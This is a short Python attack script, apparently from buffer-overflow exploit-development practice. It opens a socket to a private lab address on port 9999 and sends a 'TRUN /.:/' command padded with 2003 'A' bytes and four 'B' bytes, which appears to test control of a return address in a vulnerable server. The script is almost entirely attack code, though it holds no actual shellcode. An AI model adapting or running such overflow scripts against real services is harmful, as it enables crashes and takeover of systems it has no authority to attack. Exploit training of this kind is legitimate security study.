#!/usr/bin/python3

import sys, socket
from time import sleep

shellcode = "A"*2003 + "B"*4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.44.128',9999))

	payload = "TRUN /.:/" + shellcode

	s.send((payload.encode()))
	s.close()

except:
	print ("Error on connection to server")
	sys.exit()
